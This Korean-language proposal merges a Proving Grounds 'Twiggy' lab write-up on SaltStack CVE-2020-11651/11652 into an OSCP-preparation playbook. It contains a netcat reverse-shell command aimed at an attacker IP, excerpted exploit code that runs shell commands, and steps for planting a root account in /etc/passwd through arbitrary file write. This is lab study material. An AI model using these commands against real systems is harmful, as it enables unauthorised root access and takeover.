# Twiggy → _PLAYBOOK 이관 제안

작성자: pg-note-forge(웨이브 18). `_PLAYBOOK.md` 는 직접 수정하지 않음 — 아래 제안을 라인 관리자가 일괄 반영.
각 항목: ①어느 절 ②병합/신규 ③넣을 본문 ④지우기 전 원문 인용.

---

## 제안 1 — A-12 "응답이 성공을 뜻하지 않는다" 에 병합

**① 어느 절**: `#### A-12. 응답이 성공을 뜻하지 않는다` (line 116) — 이미 노트가 [[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]·[[Squid]] 와 교차링크된 클러스터.

**② 병합** — 신규 항목 아님. 기존 A-12 본문 끝에 Twiggy 사례 한 단락 추가.

**③ 넣을 본문(제안)**:

> [[Twiggy]] — SaltStack CVE-2020-11651 PoC 의 `--exec` 옵션. 서버가 `{'jid': '...'}` 를 돌려주면 PoC 는 `if rets.get('jid'): print('[+] Successfully scheduled job: ...')` 로 즉시 성공을 찍음(`exploit.py:235`). `jid` 는 "작업 ID 를 발급받았다"는 뜻일 뿐 명령이 실행됐는지·성공했는지는 응답에 담기지 않음 — runner 는 비동기라 결과가 job cache 로 나중에 들어감. 리스너에 30초 이상 아무것도 안 와서 알아챔. **"작업이 예약되었다" ≠ "명령이 실행되었다"** 가 이 패턴의 SaltStack 판.
> → 판별: 도구가 성공을 말하면 도구 바깥에서 확인(리스너·부수효과 파일 되읽기). 셸이 안 붙으면 셸을 고치려 들지 말고 다른 원시로 갈아탈 것 — 이 박스는 `--exec` RCE 를 포기하고 같은 PoC 의 `--upload-src`/`--upload-dest`(임의 파일 쓰기, 동기 호출이라 서버 응답을 즉시 받음)로 전환해 `/etc/passwd` 에 UID 0 계정을 심는 경로로 성공함.

**④ 지우기 전 원문(구 노트 6장 ②, 전문)**:

```
### ② `--exec` RCE가 "성공"했는데 셸이 안 붙었다 ★ 가장 큰 함정

root key를 얻은 직후, 가장 빠른 길로 보이는 `--exec`를 시도했다:

┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 --exec "nc 192.168.45.173 4444 -e /bin/sh"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to execute nc 192.168.45.173 4444 -e /bin/sh on 192.168.189.62
[+] Successfully scheduled job: 20260611035400329542

![[Pasted image 20260611125419.png]]

"[+] Successfully scheduled job: 20260611035400329542"가 찍혔다. 그런데 리스너에는 아무것도 오지 않았다.

PoC 코드를 보면 이 메시지가 아무것도 보증하지 않는다는 게 드러난다:

# exploit.py:235
def pwn_exec(channel, root_key, cmd, master_ip, jid):
    msg = {
        'key': root_key,
        'cmd': 'runner',
        'fun': 'salt.cmd',
        'saltenv': 'base',
        'user': 'sudo_user',
        'kwarg': {
            'fun': 'cmd.exec_code',
            'lang': 'python',
            'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
        },
        'jid': jid,
    }
    ...
    if rets.get('jid'):
        print('[+] Successfully scheduled job: {}'.format(rets['jid']))

`rets`에 「jid」 키가 있기만 하면 성공 메시지를 찍는다. jid는 그냥 작업 ID를 발급받았다는 뜻이다 — 명령이 실행됐는지, 실행돼서 성공했는지는 응답에 아예 담기지 않는다. runner는 비동기라서 결과가 나중에 job cache로 들어간다.

실패 후보 원인 (전부 확정하지 못했다 — 랩 반납 후라 재현 불가):

| 후보 | 근거 | 판정 |
|---|---|---|
| 타겟에 nc가 없거나 -e가 없다 | CentOS 7 기본은 nmap-ncat. 최소 설치에는 nc 자체가 없는 경우가 흔하다 | [가정] 가장 유력 |
| 아웃바운드 방화벽 | nmap이 인바운드 65529포트를 filtered로 보고했다 — 앞단에 방화벽이 있다는 확증이고, 아웃바운드도 같은 정책일 개연성이 높다 | [가정] 유력 |
| runner 실행 자체가 실패 | user: 'sudo_user'가 하드코딩돼 있다(exploit.py:244). 존재하지 않는 사용자 이름이라 마스터 측 인가 단계에서 걸렸을 수 있다 | [가정] 가능 |
| cmd.exec_code/lang: python 미지원 | salt 버전에 따라 실행 모듈 이름이 다르다 | [가정] 가능 |

어떻게 알아챘는가: 리스너에 30초 넘게 아무것도 오지 않아서 알았다. 리스너를 미리 띄워두고, 성공 메시지가 아니라 리스너를 봤기 때문에 오래 헤매지 않았다.

어떻게 빠져나왔는가: RCE를 고치려 하지 않고 원시(primitive)를 바꿨다. 같은 PoC가 제공하는 --upload-src/--upload-dest(임의 파일 쓰기)는 동기 호출이라 서버 응답을 즉시 받는다. 리버스셸을 포기하고 /etc/passwd + SSH로 간 것이 정답이었다.

리버스셸이 안 붙을 때 의심 순서
1. 리스너가 실제로 떠 있는가 — ss -lntp | grep 4444. tmux 창을 착각하는 사고가 잦다
2. IP가 맞는가 — VPN 인터페이스 IP다(ip a show tun0). 여기서는 192.168.45.173
3. 아웃바운드 필터 — 4444는 자주 막힌다. 443/53/80으로 바꿔본다 (거의 항상 열려 있다)
4. 타겟에 그 바이너리가 있는가 — nc/nc -e/bash -i/python3. -e가 없는 nc가 표준이다
5. 명령 인용이 중간에 깨졌는가 — 여러 겹의 인용을 통과한다면 base64로 감싼다
6. 그래도 안 되면 셸을 포기한다 — 파일 쓰기·크론·SSH 키·/etc/passwd가 전부 셸 없이 root가 되는 길이다
```

---

## 제안 2 — A-14 "공개 PoC는 실행 전에 소스를 읽는다" 에 병합

**① 어느 절**: `#### A-14. 공개 PoC는 실행 전에 소스를 읽는다` (기존, [[Clue]]·[[Cockpit]]·[[Codo]]·[[Exfiltrated]]·[[pyLoader]]·[[Crane]]·[[MiddlewareBypass]] 사례 누적).

**② 병합**.

**③ 넣을 본문(제안)** — 4개 소주제를 한 박스 사례로 묶어서:

> [[Twiggy]] — `CVE-2020-11651-poc`(jasperla) 하나에서 함정 4종이 한꺼번에 나왔음.
> **① README ≠ 코드.** README 는 `[+] Salt version: 3000.1` 을 찍는다고 보여주지만 실행에는 그 줄이 없었음. `git log` 로 확인하니 저자가 커밋 `eca6ba2`(`Rework version / vulnerability detection`)에서 "Don't bother checking the local salt version, it's irrelevant" 라며 이미 지웠던 코드 — `salt.version.__version__` 은 **공격자 kali 에 pip 로 깐 salt(3008.0) 의 버전이지 타겟 버전이 아니었음.** salt 는 애초에 4506 이 인증 없이 버전을 알려주지 않으므로(`ClearFuncs` 13개 메서드 어디에도 버전 문자열 리턴 없음), 이 박스에서 타겟 salt 버전은 끝까지 확인 못함 — `_prep_auth_info` 가 응답했다는 사실 자체가 유일한 취약 증거였고 그것으로 충분했음.
> → 버전 배너가 없으면 **행위 차이**로 판정: `{'cmd': 'ping'}`(항상 응답, 기준선) vs `{'cmd': '_prep_auth_info'}`(취약이면 4-튜플, 패치면 `{}`) — 이 판별은 소스에서 도출했고 실기 확인은 못함 `[가정]`.
> **② 성공 판정 로직을 직접 읽어라.** `--exec` 의 `if rets.get('jid')` 는 A-12 참조.
> **③ `--run-checks`(`-c`) 는 마스터 «자기 자신»에서 돌리는 방어자용 점검 코드였고 원격 공격 옵션이 아니었음.** 게다가 세 군데 깨져 있음 — `salt.utils.fopen`(최신 salt 에서 제거된 API, `AttributeError`) · `debug` 전역 참조(실제 변수는 `args.debug`, `NameError`) · `pp(rets)`(`pprint` import 누락, `NameError`). 결론: 건드리지 말 것.
> **④ `--force`(`-f`) 는 죽은 옵션.** `parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')` — `default=False` 인데 `action='store_false'` 라 `-f` 를 줘도 안 줘도 값이 `False` 로 고정되고, `args.force` 는 스크립트 어디서도 안 읽힘. ③의 커밋에서 버전 판정이 통째로 사라지며 이 옵션이 제어하던 대상 자체가 없어졌는데 옵션만 남은 것.
> → 정리: **공개 PoC 3대 함정 — README는 코드보다 오래됐다고 가정 / 버전 문자열이 누구 것인지 확인 / 성공·실패 판정 로직을 직접 읽는다.** 시험장에서 PoC 를 받으면 실행 전 30초만 소스를 훑을 것.

**④ 지우기 전 원문**: 구 노트 6장 ③④⑤ 전문(각 절 전체 표·diff·코드 인용 포함, 위 요약이 핵심을 보존했으나 원문은 git 이력의 `_backup/Twiggy.md.bak` 및 커밋 이력에 보존됨).

---

## 제안 3 — 신규: "낯선 포트는 서비스 이름이 아니라 번호로 먼저 좁혀라" (검색 «이전» 단계)

**① 어느 절**: 신규. `B-2-15`("모르는 서비스를 만났을 때의 절차 — ZooKeeper 4자 명령")와 **인접하지만 다른 단계**를 다룸 — B-2-15 는 "제품을 이미 특정한 뒤" 제품명으로 검색하라는 절차이고, 이 제안은 "nmap 의 SERVICE 칼럼 자체가 제품이 아니라 전송 계층 이름일 수 있다"는 **그 앞 단계**. 역검색 결과 정확히 같은 증상의 기존 카드를 못 찾음.

**② 신규** (번호는 라인 관리자가 배정, `B-2-15` 근처에 배치 권장 + 상호 링크).

**③ 넣을 본문(제안)**:

> #### B-2-1x. nmap `SERVICE` 열은 전송 계층 이름일 수 있다 — 첫 검색어는 포트 번호로
>
> [[Twiggy]] — nmap 이 4505/4506 을 `zmtp`(ZeroMQ ZMTP, 전송 프로토콜) 로 표시. `"Zeromq ZMTP 2.0 exploit"` 로 검색하면 상위 3건이 libzmq **라이브러리 자체**의 문제(HackerOne #477073·CVE-2014-9721·zeromq/libzmq issue #3351)로 빠짐 — 전부 이 박스와 무관. 4번째에서야 Exploit-DB 48421 "Saltstack 3000.1 RCE" 등장. `zmtp` 는 "HTTP" 와 같은 층위의 답이라, 그 위에 뭐가 도는지(WordPress 냐 Jenkins 냐)를 몰랐던 것.
> → **검색어 우선순위**: ①포트 번호(`"4505" "4506"` — 제품을 특정) ②정확한 버전 문자열 ③HTTP 타이틀·배너 ④서비스 이름(가장 마지막, 전송 계층 이름일 수 있음). 이 박스는 4순위로 시작해 약 30분 소모 `[가정]`, 1순위였으면 5분.
> → **외워둘 포트 쌍**: 4505/4506=SaltStack salt-master · 8000=salt-api/Django dev server · 5985/5986=WinRM · 6379=Redis · 2375/2376=Docker API · 11211=memcached · 9200=Elasticsearch · 8500=Consul. 공통 구조 — "인증 없이 관리 평면에 닿는다".
> → **frontmatter 오염 주의**: `zmtp exploit` 검색 결과의 CVE-2014-9721 은 `extract.py` 의 CVE 정규식이 본문 어디든 긁으므로, "무관하다"고 설명하려 적은 번호까지 색인에 잘못 들어갈 수 있음(`manual_cves: true` 로 방지).

**④ 지우기 전 원문**: 구 노트 6장 ①(전문, 표 2개 포함) — `_backup/Twiggy.md.bak` 보존.

---

## 제안 4 — 신규: SaltStack ClearFuncs 거부목록 우회 — "내부 메서드가 RPC 이름공간에 새어 나옴" 일반화 카드

**① 어느 절**: 신규 (B 절, "인증·인가" 계열). 역검색으로 "허용 목록"·"denylist"·"getattr" 키워드의 기존 카드를 찾지 못함.

**② 신규**.

**③ 넣을 본문(제안)**:

> #### B-1x. 문자열로 함수를 고르는 디스패처는 "막는 목록"이 아니라 "통과시키는 목록"인지 확인
>
> [[Twiggy]] SaltStack CVE-2020-11651 — `_handle_clear()` 가 `cmd.startswith('__')`(밑줄 두 개) 만 거부하는 **거부 목록**으로 `getattr(clear_funcs, cmd)` 를 호출. 내부 헬퍼 `_prep_auth_info` 는 밑줄이 **하나**라 통과 — 인자 없이 부르면 마스터 root key 를 그대로 리턴. 패치는 `expose_methods`(6개) **허용 목록** + `get_method()` 로 교체.
> → **점검 질문**: "호출 가능한 이름이 allowlist 로 제한돼 있는가, denylist 이거나 아예 없는가?" "막을 것을 세는 코드"를 보면 의심하고 "통과시킬 것을 세는 코드"를 찾을 것.
> → **같은 구조의 다른 언어 사례**: PHP `call_user_func($_GET['fn'], ...)` · Java 리플렉션 라우터의 `getDeclaredMethod()` · Python `getattr(handler, request['action'])` · Ruby on Rails `send(params[:method])`.
> → **검증 함수가 코드베이스에 «있다»는 것과 위험 지점에서 «불린다»는 것은 다름.** CVE-2020-11652(같은 박스, 경로 트래버설)의 `clean_path()` 는 취약 버전에도 이미 존재했으나 `file_roots.py` 가 호출하지 않았음 — 패치는 새 함수를 안 만들고 **호출을 추가**했을 뿐.

**④ 지우기 전 원문**: 구 노트 2장 2-2(전문)·2-4 말미("검증 함수가 있다"단락)·2-5("취약→패치 요약해서 외워라" 단락). `_backup/Twiggy.md.bak` 보존.

---

## 제안 5 — 신규: crypt 해시 형식 실측 카드

**① 어느 절**: 신규. 역검색 결과 `$1$`/`$5$`/`$6$`·`openssl passwd`·`mkpasswd`·`python crypt` 관련 기존 카드 없음.

**② 신규**.

**③ 넣을 본문(제안)**:

> #### B-3x. `/etc/passwd` 에 심을 crypt 해시 만들기 — `openssl passwd` 가 가장 안전한 선택
>
> ```text
> $1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0
>  │  │        └─ 해시 본문
>  │  └─ salt(8자, 매번 랜덤)
>  └─ 알고리즘 ID
> ```
> | ID | 알고리즘 | 비고 |
> |---|---|---|
> | (없음) | 전통 DES crypt | 8자까지만 유효, 쓰지 말 것 |
> | `$1$` | MD5-crypt | `openssl passwd` 기본값. glibc 전부 지원 — 호환성 최고 |
> | `$5$` | SHA-256-crypt | `openssl passwd -5` |
> | `$6$` | SHA-512-crypt | `openssl passwd -6`, 현대 리눅스 기본 |
>
> [[Twiggy]] — CentOS 7 대상, 지원 알고리즘 확인 불가 상황에서 `$1$`(기본값) 채택이 옳은 판단이었음. 강도는 여기서 무의미(비밀번호를 이미 앎).
> **대안과 함정**: `openssl passwd -1 -salt xyz <pw>`(salt 고정, 재현 가능) · `mkpasswd -m sha-512 <pw>`(`whois` 패키지, kali 에 없을 수 있음) · `python3 -c 'import crypt; ...'`(**Python 3.13 에서 `crypt` 모듈 제거됨** — 최신 kali 원라이너가 죽음) · `perl -e 'print crypt(...)'`(perl 은 거의 항상 있음). **`openssl passwd` 가 가장 안전한 기본 선택.**
> `/etc/passwd`에 UID 0 계정을 추가하는 절차 자체는 [[Access]]·[[Flu]]·[[Clue]]·[[Twiggy]] 공통 — 핵심은 UID=0 필드와 비밀번호 필드에 해시 직접 기입(shadow 미참조).

**④ 지우기 전 원문**: 구 노트 4-2 전문(표+원문 포함). `_backup/Twiggy.md.bak` 보존.

---

## 제안 6 — B-14(트래버설 `--path-as-is`) 에 교차 참조 한 줄 추가

**① 어느 절**: `#### B-14. traversal 을 손으로 칠 때 --path-as-is` (line 3457).

**② 병합** — B-14 는 HTTP/curl 정규화 맥락. Twiggy 는 HTTP 가 아닌 salt wheel API 트래버설이라 같은 "넉넉히 넣기" 원칙이 **다른 프로토콜**에서도 성립함을 보여주는 사례.

**③ 넣을 본문(제안, B-14 말미에 추가)**:

> [[Twiggy]] — 같은 원칙이 HTTP 밖에서도 성립. salt `wheel file_roots.write` 트래버설에서 `/srv/salt`(루트에서 2단계) 대비 `../` 5개를 넣었음 — 필요한 건 2개뿐이었지만 초과분은 무해(`/.. == /`). **깊이를 정확히 셀 필요 없이 넉넉히(5~8개) 넣는 것이 실전적**임을 재확인.

**④ 지우기 전 원문**: 구 노트 2-4 "`../`를 몇 개 넣어야 하는가" 단락 + 7장 항목 7.

---

## 제안 7 — C(반사 체크리스트)

**① 어느 절**: `## C. 반사 체크리스트` (line 6199). 역검색 없이 신규 항목으로 추가(기존 세부 번호 불명 — 관리자가 배정).

**② 병합/신규 혼재** — 관리자가 기존 체크리스트 구조를 보고 판단.

**③ 넣을 본문(제안, 구 노트 7장에서 A/B/D/E 로 안 간 나머지)**:

> - 임의 파일 읽기를 얻으면 순서 고정: ① `/etc/passwd`(OS·계정) ② `/etc/shadow`(해시) ③ `/root/.ssh/id_rsa` ④ `/root/proof.txt`·`/home/*/local.txt`(읽기만으로 플래그 끝날 수 있음) ⑤ 앱 설정 파일(DB 자격증명 재사용). [[Twiggy]] 실측.
> - 임의 파일 쓰기(root) 를 얻으면 `/etc/passwd` 에 UID 0 줄 추가: `이름:<openssl passwd 해시>:0:0:root:/root:/bin/bash`. **덮어쓰기 원시는 반드시 먼저 읽어라** — 새 줄만 올리면 기존 계정이 전부 사라져 부팅 불능.
> - 셸을 잡자마자 칠 5개(root 를 이미 얻었어도 습관): `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.*`.
> - 증거는 `whoami; hostname; ip a | grep 'inet '; cat /root/proof.txt` 를 한 화면에 — [[Twiggy]] 실제 스크린샷에는 `ip a` 가 빠져 있었음(시험이었으면 감점).

**④ 지우기 전 원문**: 구 노트 7장 항목 4·5·6·13·14(전문).

---

## 제안 8 — D(시간 배분·손절 기준)

**① 어느 절**: `## D. 시간 배분 · 손절 기준` (line 6381).

**② 신규 항목 추가**.

**③ 넣을 본문(제안)**:

> [[Twiggy]] 시간 배분 복기 — nmap(1분, `--min-rate 5000` 덕) → `zmtp` 검색으로 SaltStack 확정까지 약 30분 `[가정]`(최대 손실 구간, 포트 번호 우선 검색이었다면 5분) → PoC clone~root key 획득 빠름 → `--exec` 시도·실패 판정 약 20분 `[가정]`(실패 자체는 정상, 리버스셸 재도전 없이 원시를 바꾼 것이 좋은 판단) → passwd 조립~업로드~SSH root 로그인.
> **손절선**: 리버스셸은 **두 번 실패하면 포기**. 포트를 바꿔(443/53) 한 번 더 시도하고, 그래도 안 되면 셸을 요구하지 않는 경로(파일 쓰기·크론·SSH 키·`/etc/passwd`)로 즉시 전환. 이 박스에서 정확히 이 전환이 정답이었음.

**④ 지우기 전 원문**: 구 노트 6장 ⑧ 표 + 손절선 문장(전문).

---

## 제안 9 — E(OSCP 시험 규정) — 스코프 경고 사례 추가

**① 어느 절**: `## E. OSCP 시험 규정 — 금지 / 제한 / 허용` (line 6690).

**② 병합** — 기존 "AutoRecon·공개 PoC 허용" 서술 근처에 스코프 위반 캡션 사례로 추가.

**③ 넣을 본문(제안)**:

> [[Twiggy]] — 사용한 SaltStack PoC 에는 `--exec-all`(`_send_pub` 이용, 연결된 **모든** 미니언에서 명령 실행, `tgt: '*'`) 옵션이 있었음. 이것도 CVE-2020-11651 의 사정권(밑줄 하나짜리 `_send_pub` 는 인증 코드가 0줄 — root key 조차 불필요)이지만 **의도적으로 쓰지 않았음.** `tgt: '*'` 는 마스터에 붙은 전 호스트를 뜻하고, 랩에 미니언이 없었을 가능성이 높아도 스코프 밖 호스트에 명령이 나갈 위험이 있는 옵션. **"모든 호스트"를 뜻하는 인자가 보이면 손을 뗄 것** — OSCP 시험에서 다른 응시자의 박스·인프라를 건드리면 실격.
> PoC 자체도 실행 전 `[!] Lester, is this what you want?` 로 2초 경고를 띄움.

**④ 지우기 전 원문**: 구 노트 6장 ⑦ 전문(코드 인용 포함) + `> [!danger] 스코프 규율` 콜아웃.

---

## 검산

- 이관 대상(구 노트 0/6/7장 + 2/4/8장 일부): 원본 기준 약 400줄 상당(0장 19줄 + 6장 297줄[708~1005행 구간] + 7장 30줄 + 2/4/8장 발췌 다수) — **삭제 vs 이관 건수는 라인 관리자 반영 후 대조**. 위 9건 제안 각각에 지우기 전 원문을 전문 인용해 두었으므로 대조 가능.
- CVE-2014-9721 은 frontmatter 에 없음(이미 `CVE-2020-11651`·`CVE-2020-11652` 만 선언, `manual_cves: true`) — 본문에 남은 언급은 전부 "무관" 명시 상태로 보존(박스 노트 Service Enumeration 절 + 위 제안 3).
